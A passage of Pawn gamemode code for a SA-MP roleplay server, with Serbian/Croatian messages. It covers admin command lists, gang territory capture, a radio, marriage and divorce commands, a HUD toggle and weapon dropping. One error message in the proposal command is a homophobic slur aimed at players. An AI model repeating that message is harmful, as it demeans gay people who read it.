	else if( PlayerInfo[ ID ][ xDBO ] ) {
	
	    PlayerInfo[ ID ][ xDBO ] = false;
	    SetPlayerColor( playerid, 0xFFFFFF00 );
		SendInfoMessage( ID, "Admin %s vam je deaktivirao Donatorski paket (BOJE)", ImeIgraca( playerid ) );
	    SendInfoMessage( playerid, "Deaktivirao si Donatorski paket (BOJE) igracu %s", ImeIgraca( ID ) );
	    SavePlayer( ID );
	
	}
	return true;
}

CMD:ah( playerid, params[] ) {

    new DialogStrgEx1[ 4000 ];
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Admin Komande "SRVBOJA1SCM"__________________________\n");
        strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /ah /a /cc /aduty /aoff /spec /specoff /veh /fixveh /slap /goto /gethere /pm /spawn /ovips /trazeni /apark\n");
		strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /lp /kazni /kick /jail /freeze /unfreeze /zatvoreni /utisani /pweapons /maskirani /aport /aupali /sethp /ban\n");
		strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /ubij /oadmins /ohelpers /opromoteri /rtc /nick /mute /jetpack /eventhelp /rtcveh /prison /proveri /nitro /disarm\n");
		strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /pokrenihungergames /zaustavihg /hgcount /pokrenifunrace /zaustavifr /frcount /pokrenihotrun /zaustavihotrun /hrcount\n");
        strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /pokrenideaglemaster /zaustavidm /dmcount /vozilohp /setskin /setarmor /bribeport /paradox /amedkit /aveh /listenf /ubistva\n");
        strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 1 | "col_white" /pustimuziku /muzika /komplettuning /afuel /proveriranac /pokrenipubg /zaustavipubg /pubgcount\n");
		if( PlayerInfo[ playerid ][ xAdmin ] >= 2 ) {
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
			strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 2 | "col_white" /offprison /offjail /warn /offmute /unmute /posaljinatut /rac /skinisatuta /proveritorbu /izvuciparadox\n");
		}
		if( PlayerInfo[ playerid ][ xAdmin ] >= 3 ) {
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
        	strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 3 | "col_white" /makepromoter /banip /getcar /odbrojavanje /vremenskiban /disarm /entercar /ekreiraj /eunisti /undisarm\n");
        	strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 3 | "col_white" /multiacc /offmultiacc /ips /offips /pokrenimuzej /zaustavimuzej /resetrobbanke /resetrobzlatare /resetrobrolex\n");
		}
        if( PlayerInfo[ playerid ][ xAdmin ] >= 4 ) {
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
        	strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 4 | "col_white" /setint /setvw /gotocar /mark /gotomark /unjail /unprison /aclearwl\n");
        	strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 4 | "col_white" /unban /unbanip /tod /vreme /napunivozila /resetujtorbu /ukloniradio /skloniblokade /ban\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"ADMIN LVL 4 | "col_white" /kreirajkombi /pocetnistats\n");
        }
        if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) {
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"HEAD ADM | "col_white" /makeleader /makehelper /healall /freezeall /unfreezeall /izbaciclana /ubaciclana /ogetcar /ocistislot /armorall\n");
			strcat( DialogStrgEx1, ""SRVBOJA1SCM"HEAD ADM | "col_white" /smenilidera /spisakclanova /offizbaciclana /setskin /givegun /setjob /skiniorgkaznu /makespecadmin /fly\n");
        }
		if( PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"SUVLASNIK | "col_white" /promenipol /oport /aktivnostigraca /muteall /gethereall /sveskole /makniwarn /razvedi /passwordigraca\n");
			strcat( DialogStrgEx1, ""SRVBOJA1SCM"SUVLASNIK | "col_white" /unmuteall /offban /vremenskiunban /setjob /richlist /ubaciprodukte /dboja /proveriimovinu /proverifirmu\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"SUVLASNIK | "col_white" /maknisastatsa /adajdozvolu /listavozila /vozilazaaukciju /fine /setstat /neaktivnost /givemoney /edit\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"SUVLASNIK | "col_white" /adminwarn /skiniadminwarn /proveriorgsef\n");
		}
		if( PlayerInfo[ playerid ][ xAdmin ] >= 7 ) {
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"____________________________________________________\n");
		    strcat( DialogStrgEx1, ""SRVBOJA1SCM"VLASNIK | "col_white" /server /adresa /dajsvima /rokniupdate /kickall /proverarada /dopustipromenuimena /makevip /dopuniresurse\n");
			strcat( DialogStrgEx1, ""SRVBOJA1SCM"VLASNIK | "col_white" /makeadmin /smeniadmin /smenipromotera /smenihelpera /specijalnoime /givearank /promeniadminkod /donatorslot /1\n");
			strcat( DialogStrgEx1, ""SRVBOJA1SCM"VLASNIK | "col_white" /vlasnici /togreport /togpomoc /nosms /togw /trenutnekordinate /hidenames /shownames /xgoto /pomerilokaciju\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"VLASNIK | "col_white" /hidenames /shownames /donatorskeboje /givekeys /givebtc /setskill /dajskillpoen /dovedisvelidere\n");
            strcat( DialogStrgEx1, ""SRVBOJA1SCM"VLASNIK | "col_white" /dovedisveadmine /dovedisvehelpere /dovedisvepromotere /promenideonice /aktivirajsneska /resetujnovacruka /resetujnovacbanka");
		}
		SPD( playerid, dialog_HELP, DSMSG, ""SRVBOJA1SCM"Admin Komande", DialogStrgEx1, "Potvrdi", "" );
	} else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

CMD:promoterhelp( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
        SCM( playerid, -1, "{ffa07a}PROMOTER | "col_white"/g /promoterspawn /vpveh");
    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

CMD:promoterspawn( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xSpawn ] == SPAWN_PROMOTER ) return SendErrorMessage( playerid, "Spawn ti je vec postavljen na promotersku bazu!");
	if( PlayerInfo[ playerid ][ xPromoter ] == 0 ) return SendErrorMessage( playerid, "Ne mozete staviti promoterski spawn jer niste promoter.");
	PlayerInfo[ playerid ][ xSpawn ] = SPAWN_PROMOTER;
	SCM( playerid, BELA, "Od sada cete se spawnati u promoter bazi.");
	return 1;
}
CMD:specadminhelp(playerid, params[])
{
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    if( PlayerInfo[ playerid ][ xSpecAdmin ] == 1 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
        strcat( DialogStrgEx, "{8EFF00}Spec Admin | "col_white" /vozilohp /jail /kick /mute /spec /specoff /port /proveristats\n");
		SPD( playerid, dialog_HELP, DSMSG, "{8EFF00}Spec Admin Komande", DialogStrgEx, "Potvrdi", "" );
    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}
CMD:hhelp( playerid, params[] ) {
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    if( PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
        strcat( DialogStrgEx, "{8EFF00}Helper | "col_white" /hveh /vozilohp /h /goto /hodg /lp /hon /hoff /fixveh /ohelpers /port /slap /rtc /eventhelp /h1 /h2\n");
        if( PlayerInfo[ playerid ][ xSupporter ] >= 3 || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {
        	strcat( DialogStrgEx, "{8EFF00}Vodja Helpera | "col_white"/ho /spec /specoff /gethere /makehelper /prison /ubij /kick /smenihelpera /dovedisvehelpere");
		}
		SPD( playerid, dialog_HELP, DSMSG, "{8EFF00}Helper Komande", DialogStrgEx, "Potvrdi", "" );
    	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    } else SendErrorMessage( playerid, "Niste ovlasteni za koristenje ove komande!");
	return 1;
}

forward ZonaZauzmi( playerid );
public ZonaZauzmi( playerid ) {

	new string[ 128 ];
	
	if( IsPlayerInDynamicArea( playerid, gZoneInfo[ gZone_ID[ playerid ] ][ gZoneRectAngle ] ) ) {
	
	    if( gZone_Time[ playerid ] > 0 ) {

	        format( string, sizeof( string ), "~w~Ostanite u teritoriji jos ~r~%d ~w~sekundi", gZone_Time[ playerid ] );
	        GameTextForPlayer( playerid, string, 1000, 4 ) ;
	        
	        gZone_Time[ playerid ]--;
	    }
	    else if( gZone_Time[ playerid ] == 0 ) {
	    
	        GangZoneStopFlashForAll( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneID ] );
	        GangZoneHideForAll( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneID ] );
	        gZone_Time[ playerid ] = 0;
	        Novi_KillTimer( gZone_Timer[ playerid ] );
	    
	        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, "Vasa organizacija je prosirila svoju vladavinu na jos jednu teritoriju." );
	    
	        if( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ] != -1 ) {

                format( string, sizeof( string ), "[TERITORIJA] Suparnicka banda %s je preuzela jednu od vasih teritorija.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
                OrgPoruka( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ], 0xFFC801C8, string );

                format( string, sizeof( string ), "[TERITORIJA] Clan %s je zauzeo teritoriju koju je kontrolisala banda %s.", ImeIgraca( playerid ), OI[ gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ] ][ oName ] );
            	OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, string );
			}
			else if( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ] == -1 ) {
			
			    format( string, sizeof( string ), "[TERITORIJA] Clan %s je zauzeo teritoriju koja je bila slboodna.", ImeIgraca( playerid ) );
            	OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, string );
			}
			
          
			gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ] = PlayerInfo[ playerid ][ xClan ];
			gZoneInfo[ gZone_ID[ playerid ] ][ gZoneTaken ] = true;
			
			new stringic[ 24 ];
            format( stringic, sizeof( stringic ), "%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oColor ] );
            strmid( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneColor ], stringic, 0, strlen( stringic ), 255 );
            
			format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ gZone_ID[ playerid ] ][ gZoneColor ] );
            GangZoneShowForAll( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneID ], HexToInt( stringic ) );
			
			GZone_Refresh( gZone_ID[ playerid ] );
			
			gZoneInfo[ gZone_ID[ playerid ] ][ gZoneTime ] = 10;
			
			GZone_Save( gZone_ID[ playerid ] );
			
            PostaviWanted( playerid, "Zauzimanje Teritorija", "Nepoznati", 6 );

            
            gZone_ID[ playerid ] = -1;

            if(PlayerInfo[playerid][xAchivements][3] == 0) {

                achivementPassed(playerid, 3, 2000);
            }
		}
	}
	else {

        new zoneID = gZone_ID[playerid];

        foreach(Player, i) {

            if(PlayerInfo[playerid][xClan] == PlayerInfo[i][xClan] && IsPlayerInDynamicArea(i, gZoneInfo[ zoneID ][ gZoneRectAngle ]) && gZone_Time[i] == 0) {

                gZone_Time[i] = gZone_Time[playerid];
                gZone_ID[i] = gZone_ID[playerid];

                Novi_KillTimer( gZone_Timer[ playerid ] );

                gZone_ID[playerid] = -1;
                gZone_Time[playerid] = 0;

                gZone_Timer[ i ] = SetTimerEx( "ZonaZauzmi", 1000, true, "i", i );

                SendInfoMessage(playerid, "Zauzimanje teritorije se prebacilo na %s zato sto si napustio teritoriju!", ImeIgraca(i));
                SendInfoMessage(i, "Zauzimanje teritorije se prebacilo na tebe zato sto je igrac %s napustio teritoriju!", ImeIgraca(playerid));

                return 1;
            }
        }
	
        GameTextForPlayer( playerid, "~w~Otisli ste iz teritorije!", 1000, 4) ;
        GangZoneStopFlashForAll( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneID ] );
	    gZone_Time[ playerid ] = 0;
	    Novi_KillTimer( gZone_Timer[ playerid ] );
	    
	    PostaviWanted( playerid, "Zauzimanje Teritorija", "Nepoznati", 6 );
        
        if( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ] != -1 ) {

    		format( string, sizeof( string ), "[TERITORIJA] Suparnicka banda %s je napustila teritoriju i prestala sa preuzimanjem.", OI[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
            OrgPoruka( gZoneInfo[ gZone_ID[ playerid ] ][ gZoneGangID ], 0xFFC801C8, string );
		}
		
		format( string, sizeof( string ), "[TERITORIJA] Clan %s je napustio teritoriju i prestao sa zauzimanjem.", ImeIgraca( playerid ) );
        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, string );
        
        gZoneInfo[ gZone_ID[ playerid ] ][ gZoneTime ] = 10;
        
        GZone_Save( gZone_ID[ playerid ] );
        
        gZone_ID[ playerid ] = -1;
	}
	return true;
}


CMD:zauzmi( playerid, params[] ) {

    if( GetFactionType( playerid ) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_MAFIJA) return SendErrorMessage( playerid, "Samo bande mogu koristiti ovu komandu." );

	new gZone__ID = GetNearestGZone( playerid );
	if( gZone__ID == -1 ) return SendErrorMessage( playerid, "Moras biti pored teritorije da bi je zauzeo." );
	if( !gZoneInfo[ gZone__ID ][ gZoneTakeable ] ) return SendErrorMessage( playerid, "Ovu teritoriju nije moguce zauzeti." );
	if( PlayerInfo[ playerid ][ xClan ] == gZoneInfo[ gZone__ID ][ gZoneGangID ] ) return SendErrorMessage( playerid, "Ne mozes zauzeti teritoriju koja je u vlasnistvu tvoje bande." );
	if( gZoneInfo[ gZone__ID ][ gZoneTime ] != 0 ) return SendErrorMessage( playerid, "Ovo je vec neko zauzimao u skorije vreme." );

    if(skoroZauzimao[playerid] >= 1) return SendErrorMessage(playerid, "Vec si skoro zauzimao neku zonu! Mozes opet zapoceti zauzimanje za %d sekundi!", skoroZauzimao[playerid]);

	new Orga = 0, Protiv = 0, hour, minute, seconds;
	gettimeEx( hour, minute, seconds );
	FixHour( hour );
	hour = shifthour;

	foreach( Player, i ) {
	    if( PlayerInfo[ i ][ xClan ] == gZoneInfo[ gZone__ID ][ gZoneGangID ] ) Protiv++;

        if( IsPlayerInDynamicArea(i, gZoneInfo[ gZone__ID ][ gZoneRectAngle ])) Orga++;
	}

    if( GetWeapon( playerid ) >= 22 && GetWeapon( playerid ) <= 40 ) {

		// if( Orga < 3 )  return SendErrorMessage( playerid, "Moras imati bar 3 ljudi iz bande u zoni koju zauzimas da bi poceo." );

	 //    if( gZoneInfo[ gZone__ID ][ gZoneGangID ] != -1 ) {

		// 	if( Protiv < 3 )  return SendErrorMessage( playerid, "Mora biti bar 3 clanova iz protivnicke bande online da bi zauzeli njihovu teritoriju." );

  //           OrgPoruka( gZoneInfo[ gZone__ID ][ gZoneGangID ], 0xFFC801C8, "[TERITORIJA] Druga banda pokusava da zauzme vasu teritoriju." );
		// }

		new stringic[ 24 ];
        format( stringic, sizeof( stringic ), "0x%s99", OI[ PlayerInfo[ playerid ][ xClan ] ][ oColor ] );

		GangZoneFlashForAll( gZoneInfo[ gZone__ID ][ gZoneID ], HexToInt( stringic ) );
		
		SCM( playerid, NARACRVENA, "ZAPOCEO SI ZAUZIMANJE TERITORIJE." );
		SCM( playerid, NARACRVENA, "Moras ostati ziv sledecih 10 minuta kako bi je osvojio." );
		SCM( playerid, NARACRVENA, "Ne smes se previse udaljiti od mesta zauzimanja, jer ce zauzimanje biti prekinuto.");

        skoroZauzimao[playerid] = 1200;
		
		gZoneInfo[ gZone__ID ][ gZoneTime ] = 10;

		gZone_ID[ playerid ] = gZone__ID;
		gZone_Time[ playerid ] = 480;
		gZone_Timer[ playerid ] = SetTimerEx( "ZonaZauzmi", 1000, true, "i", playerid );

        new str[128];
        format(str, sizeof(str), "Igrac %s je krenuo sa zauzimanjem teritorije!", ImeIgraca(playerid));

        AdminPoruka( 0xFFC0CBAA, str );
	
		OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0xFFC801C8, "[TERITORIJA] Clan vase organizacije pokusava da zauzme tudju teritoriju." );
			
		
	} else return SendErrorMessage( playerid, "Nemate oruzije za zauzimanje teritorije!" );

	return 1;
}

CMD:radio( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xBoombox ] != true ) return SendErrorMessage( playerid, "Nemate radio." );

	new item[ 24 ];
	if( sscanf( params, "s[24] ", item ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	    SendUsageMessage( playerid, "/radio [opcija]");
	    SCM( playerid, BELA, "[Opcije]: postavi, podigni, url");
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	    return 1;
	}
	if( strcmp( item, "postavi", true ) == 0 ) {
	    if( BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Vec ste postavili radio." );
		if( Boombox_Nearest( playerid ) != INVALID_PLAYER_ID ) return SendErrorMessage( playerid, "Vec ste u blizini drugog radia.");
		if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate napustiti vozilo prvo." );

		Boombox_Place( playerid );

		format( globalstring, sizeof( globalstring ), "** %s stavlja radio na pod i podesava ga.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		SCM( playerid, ZUTA, "Postavili ste radio (koristite \"/radio\" za opcije).");
		return 1;
	}
	else if( strcmp( item, "podigni", true ) == 0 ) {
	    if( !BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Nemate postavljen radio.");
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, BoomboxInfo[ playerid ][ boomboxPos ][ 0 ], BoomboxInfo[ playerid ][ boomboxPos ][1], BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] ) ) return SendErrorMessage( playerid, "Niste u blizini vaseg radia." );

		Boombox_Destroy( playerid );
        format( globalstring, sizeof( globalstring ), "** %s je podigao svoj radio s poda.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		return 1;
	}
	else if( strcmp( item, "url", true ) == 0 ) {
	    new url[ 128 ];
	    if( sscanf( params, "s[24]s[128]", item, url ) ) return SendUsageMessage( playerid, "/radio url [song url]");
        if( !BoomboxInfo[ playerid ][ boomboxPlaced ] ) return SendErrorMessage( playerid, "Nemate postavljen radio.");
		if( !IsPlayerInRangeOfPoint( playerid, 3.0, BoomboxInfo[ playerid ][ boomboxPos ][ 0 ], BoomboxInfo[ playerid ][ boomboxPos ][ 1 ], BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] ) ) return SendErrorMessage( playerid, "Niste u blizini vaseg radia.");

		Boombox_SetURL( playerid, url );
        format( globalstring, sizeof( globalstring ), "** %s okrece kotacic na radiu te mjenja stanicu.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
		return 1;
	}
	else {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	    SendUsageMessage( playerid, "/radio [opcija]");
	    SCM( playerid, BELA, "[Opcije]: postavi, podigni, url");
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
	}
	return 1;
}

CMD:razvedi( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/razvedi [ ID/Deo imena ] " );
    if( id == IPI) return SendErrorMessage(playerid, "Pogresan ID Korisnika");
	format( globalstring, sizeof( globalstring ), "*Razveo si igraca %s.", ImeIgraca( id ) );
	SCM(playerid, SVETLOPLAVA, globalstring );
	format( globalstring, sizeof( globalstring ), "*Admin %s te je razveo.", ImeIgraca( playerid ) );
	SCM( id, SVETLOPLAVA, globalstring );
	strmid( PlayerInfo[ id ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
	PlayerInfo[ id ][ xMarried ] = false;
	return 1;
}

CMD:zaprosi( playerid, params[] ) {
	new id;
	if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/zaprosi [ ID/Deo imena ]");
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");
	if( PlayerInfo[ playerid ][ xNovac ] < 10000 ) return SendErrorMessage( playerid, "Trosak svadbe kosta $10000!");
	if( PlayerInfo[ playerid ][ xMarried ] != false ) return SendErrorMessage( playerid, "Vec si ozenjen/udana!");
	if( PlayerInfo[ id ][ xMarried ] != false ) return SendErrorMessage( playerid, "Vec je ozenjen/udana!");
    if( PlayerInfo[ playerid ][ xPol ] != 1 ) return SendErrorMessage( playerid, "Samo muski pol moze da zaprosi!");
	if( PlayerInfo[ id ][ xPol ] != 2 ) return SendErrorMessage( playerid, "Da li si peder ?!");
	if( IsPlayerNearPlayer( 8.0, playerid, id ) ) {
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebe zaprosit!");
		format( globalstring, sizeof( globalstring ), "* Zaprosio si %s.", ImeIgraca( id ) );
		SCM( playerid, SVETLOPLAVA, globalstring );
		format( globalstring, sizeof( globalstring ), "* %s te zaprosio/la (pisi /prihvati marriage) da prihvatis brak.", ImeIgraca( playerid ) );
		SCM( id, SVETLOPLAVA, globalstring );
		ProposeOffer[ id ] = playerid;
	}
	else return SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!" );
	return 1;
}

CMD:svjedok( playerid, params[] ) {
	new id;
	if( sscanf( params, "u", id  ) ) return SendUsageMessage( playerid, "/svjedok [ ID/Deo imena ]");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");
	if( IsPlayerNearPlayer( 8.0, playerid, id ) ) {
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sebe staviti za svjedoka!");
		format( globalstring, sizeof( globalstring ), "* Pitao si %s hoce li biti tvoj svjedok na vjencanju.", ImeIgraca( id ) );
		SCM(playerid, SVETLOPLAVA, globalstring );
		format( globalstring, sizeof( globalstring ), "* %s te pitao hoces li biti njegov/njezin svjedok na vjencanju (pisi /prihvati witness  - da prihvatis).", ImeIgraca( playerid ) );
		SCM( id, SVETLOPLAVA, globalstring );
      	MarryWitnessOffer[ id ] = playerid;
	}
	else return SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!");
	return 1;
}

CMD:divorce( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMarried ] == false ) return SendErrorMessage( playerid, "Nisi ozenjen/udana!");
	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/divorce [ ID/Deo imena ] ");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");
	if( IsPlayerNearPlayer( 8.0, playerid, id ) ) {
		if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete se razvesti sami od sebe!");
		new dstring[ MAX_PLAYER_NAME ], wstring[ MAX_PLAYER_NAME ];
		format( globalstring, sizeof( globalstring ), "%s", ImeIgraca( id ) );
		strmid( wstring, globalstring, 0, strlen( globalstring ), 255 );
		format( globalstring, sizeof( globalstring ), "%s", PlayerInfo[ playerid ][ xMarriedTo ] );
		strmid( dstring, globalstring, 0, strlen( globalstring ), 255 );
		if( strcmp( dstring, wstring, true ) == 0 ) {
			format( globalstring, sizeof( globalstring ), "* Poslao si papire za razvod %s.", ImeIgraca( id ) );
			SCM( playerid, SVETLOPLAVA, globalstring );
			format( globalstring, sizeof( globalstring ), "* %s poslao/la ti je papire za razvod (pisi /prihvati divorce) da prihvatis.", ImeIgraca( playerid ) );
			SCM( id, SVETLOPLAVA, globalstring );
		    DivorceOffer[ id ] = playerid;
		}
		else return SendErrorMessage( playerid, "Taj igrac nije vjencan za tebe!");
	}
	else return SendErrorMessage( playerid, "Osoba se ne nalazi u vasoj blizini!");
	return 1;
}

CMD:toghud( playerid,params[] ) {

    TogPlayerHud( playerid );
    return true;
}

stock TogPlayerHud( playerid ) {

	if( TogHud[ playerid ] ) {

        for(new i=0; i<30; i++)
        {
            TextDrawShowForPlayer(playerid, InGame_TD[i]);
        }
		
		PlayerTextDrawShow( playerid, BankaIgraca[ playerid ] );
	    PlayerTextDrawShow( playerid, ZlatoIgraca[ playerid ] ); 
        PlayerTextDrawShow( playerid, SkinIgraca[playerid]);
        // PlayerTextDrawShow(playerid, DoPlateTD[playerid]);
        // PlayerTextDrawShow( playerid, PrljavNovacTD[playerid]);
        PlayerTextDrawShow( playerid, LokacijaIgracaTD[playerid]);
        // PlayerTextDrawShow(playerid, LevelIgracaTD[playerid]);

	    
	    //happyHoursTDControl(ServerInfo[HappyHours]);

        happyHoursPlayerTDControl(playerid, true);
        happyJobPlayerTDControl(playerid, true);
	    
	    TogHud[ playerid ] = false;
	}
	else if( !TogHud[ playerid ] ) {
	    for(new i=0; i<30; i++)
        {
            TextDrawHideForPlayer(playerid, InGame_TD[i]);
        }

		PlayerTextDrawHide( playerid, BankaIgraca[ playerid ] );
	    PlayerTextDrawHide( playerid, ZlatoIgraca[ playerid ] );
        PlayerTextDrawHide( playerid, SkinIgraca[playerid]);
        // PlayerTextDrawHide( playerid, DoPlateTD[playerid]);
        // PlayerTextDrawHide( playerid, PrljavNovacTD[playerid]);
        PlayerTextDrawHide( playerid, LokacijaIgracaTD[playerid]);
        // PlayerTextDrawHide(playerid, LevelIgracaTD[playerid]);

        happyJobPlayerTDControl(playerid, false);
        happyHoursPlayerTDControl(playerid, false);
    
	    TogHud[ playerid ] = true;
	    
	}
}

alias:dropgun("bacioruzje");
CMD:dropgun( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Morate biti level 3+ da bi mogli dropati oruzje." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi bacili oruzje!" );
	if( DropedGun[ playerid ] != 0 ) return SendErrorMessage( playerid, "Morate sacekati jos %d sekundi da bi ponovo bacili oruzje.", DropedGun[ playerid ] );
	if( GetFactionType( playerid ) == ORG_TIP_PD ) return SendErrorMessage( playerid, "PD nema potrebe da koristi ovu komandu." );
	if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na DM Zoni." );
    if(radiMisiju[playerid] != 0) return SendErrorMessage(playerid, "Ne mozes to dok radis misiju!");
	
	new GunID = GetWeapon( playerid );
	new GunAmmo = GetPlayerAmmo( playerid );
	if( GunID > 0 && GunAmmo != 0 ) {
	    if( GetWeapon( playerid ) == GetPlayerWeapon( playerid ) ) {
			new f = -1;
            for( new a = 0; a < MAX_GOBJ; a++ ) {
                if( dGunData[ a ][ ObjPos ][ 0 ] == 0.0 ) {
                    f = a;
                    break;
                }
            }
            if( f == -1 ) return SendErrorMessage( playerid, "Trenutno ne mozes baciti oruzje na pod." );
            if(isForbidenWeapon(GunID)) return SendErrorMessage(playerid, "Ovo oruzije nije moguce baciti!");
			RemovePlayerWeapon( playerid, GunID );
			
			dGunData[ f ][ ObjData ][ 0 ] = GunID;
			dGunData[ f ][ ObjData ][ 1 ] = GunAmmo;

			GetPlayerPos( playerid, dGunData[ f ][ ObjPos ][ 0 ], dGunData[ f ][ ObjPos ][ 1 ], dGunData[ f ][ ObjPos ][ 2 ] );
            dGunData[ f ][ gObjID ] = CreateDynamicObject( WeaponInfos[ GunID ][ wModel ], dGunData[ f ][ ObjPos ][ 0 ], dGunData[ f ][ ObjPos ][ 1 ], dGunData[ f ][ ObjPos ][ 2 ]-1, 93.7, 120.0, 120.0 );
            new string[128];
            new gunName[32];
            GetWeaponName(GunID,gunName,sizeof(gunName));
            format(string, sizeof(string), "Da pokupite %s sa %d metkova kucajte\n/pickupgun", gunName, GunAmmo);
            gunLabel[f] = CreateDynamic3DTextLabel(string, SRVBOJA1, dGunData[ f ][ ObjPos ][ 0 ], dGunData[ f ][ ObjPos ][ 1 ], dGunData[ f ][ ObjPos ][ 2 ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
            DropedGun[ playerid ] = 30;
			SendClientMessageEx( playerid, -1, "Bacio si oruzje "col_crvena"%s.", WeaponInfos[ dGunData[ f ][ ObjData ][ 0 ] ][ wName ] );

            new string1[ 128 ];
